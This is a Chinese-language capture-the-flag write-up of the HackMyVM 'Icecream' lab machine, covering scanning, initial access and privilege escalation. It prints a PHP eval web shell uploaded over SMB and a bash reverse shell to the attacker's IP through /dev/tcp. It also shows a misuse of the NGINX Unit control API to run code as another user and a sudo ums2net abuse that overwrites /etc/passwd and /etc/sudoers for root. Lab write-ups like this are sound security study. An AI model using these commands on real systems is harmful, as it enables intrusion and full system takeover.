---
title: HMV Icecream
published: 2025-02-16
pinned: false
description: HMV Icecream wp
tags: ['HMV']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-02-16
pubDate: 2025-02-16
---


## hmv_Icecream

### 靶场链接

https://hackmyvm.eu/machines/machine.php?vm=Icecream

### 日常扫描
```┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -T4 -Pn -p- 192.168.64.22
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 16:05 HKT
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 60.00% done; ETC: 16:06 (0:00:07 remaining)
Nmap scan report for 192.168.64.22
Host is up (0.00048s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 68:94:ca:2f:f7:62:45:56:a4:67:84:59:1b:fe:e9:bc (ECDSA)
|_  256 3b:79:1a:21:81:af:75:c2:c1:2e:4e:f5:a3:9c:c9:e3 (ED25519)
80/tcp   open  http        nginx 1.22.1
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.22.1
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
9000/tcp open  cslistener?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Server: Unit/1.33.0
|     Date: Mon, 10 Feb 2025 08:05:55 GMT
|     Content-Type: application/json
|     Content-Length: 40
|     Connection: close
|     "error": "Value doesn't exist."
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Unit/1.33.0
|     Date: Mon, 10 Feb 2025 08:05:55 GMT
|     Content-Type: application/json
|     Content-Length: 1042
|     Connection: close
|     "certificates": {},
|     "js_modules": {},
|     "config": {
|     "listeners": {},
|     "routes": [],
|     "applications": {}
|     "status": {
|     "modules": {
|     "python": {
|     "version": "3.11.2",
|     "lib": "/usr/lib/unit/modules/python3.11.unit.so"
|     "php": {
|     "version": "8.2.18",
|     "lib": "/usr/lib/unit/modules/php.unit.so"
|     "perl": {
|     "version": "5.36.0",
|     "lib": "/usr/lib/unit/modules/perl.unit.so"
|     "ruby": {
|     "version": "3.1.2",
|     "lib": "/usr/lib/unit/modules/ruby.unit.so"
|     "java": {
|     "version": "17.0.11",
|     "lib": "/usr/lib/unit/modules/java17.unit.so"
|     "wasm": {
|     "version": "0.1",
|     "lib": "/usr/lib/unit/modules/wasm.unit.so"
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: Unit/1.33.0
|     Date: Mon, 10 Feb 2025 08:05:55 GMT
|     Content-Type: application/json
|     Content-Length: 35
|     Connection: close
|_    "error": "Invalid method."
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9000-TCP:V=7.94SVN%I=7%D=2/10%Time=67A9B363%P=aarch64-unknown-linux
SF:-gnu%r(GetRequest,4A8,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Unit/1\.33\
SF:.0\r\nDate:\x20Mon,\x2010\x20Feb\x202025\x2008:05:55\x20GMT\r\nContent-
SF:Type:\x20application/json\r\nContent-Length:\x201042\r\nConnection:\x20
SF:close\r\n\r\n{\r\n\t\"certificates\":\x20{},\r\n\t\"js_modules\":\x20{}
SF:,\r\n\t\"config\":\x20{\r\n\t\t\"listeners\":\x20{},\r\n\t\t\"routes\":
SF:\x20\[\],\r\n\t\t\"applications\":\x20{}\r\n\t},\r\n\r\n\t\"status\":\x
SF:20{\r\n\t\t\"modules\":\x20{\r\n\t\t\t\"python\":\x20{\r\n\t\t\t\t\"ver
SF:sion\":\x20\"3\.11\.2\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/modules
SF:/python3\.11\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"php\":\x20{\r\n\t\t
SF:\t\t\"version\":\x20\"8\.2\.18\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/uni
SF:t/modules/php\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"perl\":\x20{\r\n\t
SF:\t\t\t\"version\":\x20\"5\.36\.0\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/u
SF:nit/modules/perl\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"ruby\":\x20{\r\
SF:n\t\t\t\t\"version\":\x20\"3\.1\.2\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib
SF:/unit/modules/ruby\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"java\":\x20{\
SF:r\n\t\t\t\t\"version\":\x20\"17\.0\.11\",\r\n\t\t\t\t\"lib\":\x20\"/usr
SF:/lib/unit/modules/java17\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"wasm\":
SF:\x20{\r\n\t\t\t\t\"version\":\x20\"0\.1\",\r\n\t\t\t\t\"lib\":\x20\"/us
SF:r/lib/unit/modules/wasm\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t")%r(HTTPOpt
SF:ions,C7,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x20Uni
SF:t/1\.33\.0\r\nDate:\x20Mon,\x2010\x20Feb\x202025\x2008:05:55\x20GMT\r\n
SF:Content-Type:\x20application/json\r\nContent-Length:\x2035\r\nConnectio
SF:n:\x20close\r\n\r\n{\r\n\t\"error\":\x20\"Invalid\x20method\.\"\r\n}\r\
SF:n")%r(FourOhFourRequest,C3,"HTTP/1\.1\x20404\x20Not\x20Found\r\nServer:
SF:\x20Unit/1\.33\.0\r\nDate:\x20Mon,\x2010\x20Feb\x202025\x2008:05:55\x20
SF:GMT\r\nContent-Type:\x20application/json\r\nContent-Length:\x2040\r\nCo
SF:nnection:\x20close\r\n\r\n{\r\n\t\"error\":\x20\"Value\x20doesn't\x20ex
SF:ist\.\"\r\n}\r\n");
MAC Address: EE:67:54:A9:FD:C8 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ICECREAM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-02-10T08:05:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.77 seconds
```

### 反弹shell

看看smb服务
```
┌──(kali㉿kali)-[~]
└─$ smbclient -L 192.168.64.22
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        icecream        Disk      tmp Folder
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.64.22 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

```

发现用户icecream
直接往共享目录里面塞一句话木马
> <?php eval($_GET[cmd]);?>

curl一下看看效果
```
    ┌──(kali㉿kali)-[~]
    └─$ curl "http://192.168.64.22/shell.php?cmd=id"
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    弹shell(记得url编码一下)
    curl "http://192.168.64.22/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.64.3%2F4444%200%3E%261%22"
```

本地监听一下，
```
www-data@icecream:/tmp$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
ice:x:1000:1000:ice,,,:/home/ice:/bin/bash
unit:x:999:995:unit user:/nonexistent:/bin/false
```
好像没有用，sudo -l也没有，思路断了，想起来nmap的时候还有其他的端口
9000端口返回
```
	
certificates	{}
js_modules	{}
config	
listeners	{}
routes	[]
applications	{}
status	
modules	
python	
version	"3.11.2"
lib	"/usr/lib/unit/modules/python3.11.unit.so"
php	
version	"8.2.18"
lib	"/usr/lib/unit/modules/php.unit.so"
perl	
version	"5.36.0"
lib	"/usr/lib/unit/modules/perl.unit.so"
ruby	
version	"3.1.2"
lib	"/usr/lib/unit/modules/ruby.unit.so"
java	
version	"17.0.11"
lib	"/usr/lib/unit/modules/java17.unit.so"
wasm	
version	"0.1"
lib	"/usr/lib/unit/modules/wasm.unit.so"
wasm-wasi-component	
version	"0.1"
lib	"/usr/lib/unit/modules/wasm_wasi_component.unit.so"
connections	
accepted	0
active	0
idle	0
closed	0
requests	
total	0
applications	{}
```

gpt跟我说这是NGINX Unit的输出，https://unit.nginx.org/controlapi/ 这是这个服务的官网，查后台进程，这个服务是ice的，那么就是通过这个提权到ice了

gpt直接告诉我payload了（）
```
PUT /config/applications HTTP/1.1
Host: 192.168.64.22:9000
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept-Encoding: gzip, deflate
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
x-real-ip: Papa
Content-Length: 73

{ "blogs": { "type": "php", "processes": 20, "root": "/tmp/shell.php" } }

本地写一个config.json
{
  "listeners": {
    "*:8088": {
      "application": "blogs"
    }
  },
  "applications": {
    "blogs": {
      "type": "php",
      "processes": 20,
      "root": "/tmp"
    }
  }
}

然后
curl -X PUT -d @config.json http://192.168.64.22:9000/config
{
        "success": "Reconfiguration done."
}

然后访问8088/shell.php  并且反弹shell
```

这个时候就是ice了（原理我慢慢研究），现在是最喜欢的提权阶段

### 提权
```
ice@icecream:/tmp$ sudo -l
sudo -l
Matching Defaults entries for ice on icecream:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User ice may run the following commands on icecream:
    (ALL) NOPASSWD: /usr/sbin/ums2net
```

ums2net的github页面是这样描述的
```
ums2net provides a way for a user to connect from a network connection to a USB mass storage device.

How to use ums2net

Insert the USB Mass Storage. Check /dev/disk/by-id/ for the unique path for that device.
Create a config file base on the above path. Please see the config file format section.
Run "ums2net -c ". ums2net will become a daemon in the background. For debugging please add "-d" option to avoid detach.
Use nc to write your image to the USB Mass Storage device. For example, "nc -N localhost 29543 < warp7.img"
```

所以我们可以用ums2net -c来提权，首先我们要写一个配置文件，既然他可以守护进程，我们就可以利用端口去写入。

第一种方法，把root密码覆盖为无
```
本地
┌──(kali㉿kali)-[~]
└─$ echo "root::0:0:root:/root:/usr/bin/bash" > tmp 

nc 192.168.64.22 23456 < tmp

远程
ice@icecream:/tmp$ echo "23456 of=/etc/passwd" > config
echo "23456 of=/etc/passwd" > config
ice@icecream:/tmp$ sudo /usr/sbin/ums2net -c config -d
sudo /usr/sbin/ums2net -c config -d
/etc/sudoers:2:11: error de sintaxis
 with the 'visudo' command as root.
          ^~~~~~~~

ums2net[1282]: Totally write 35 bytes to /etc/passwd

ice@icecream:/tmp$ su
su
id
uid=0(root) gid=0(root) grupos=0(root)

```

方法二覆盖sudoers文件（至于为什么是这个文件，一些佬是直接用的，一些是试出来的）
我感觉主要是因为
当用户执行sudo时，系统会主动寻找/etc/sudoers文件，判断该用户是否有执行sudo的权限
–>确认用户具有可执行sudo的权限后，让用户输入用户自己的密码确认
–>若密码输入成功，则开始执行sudo后续的命令
```
远程
echo "8889 of=/etc/sudoers" > config
sudo /usr/sbin/ums2net -c config -d

本地
echo 'ice ALL=(ALL) NOPASSWD: ALL'|nc 192.168.64.22 8889

远程
su
```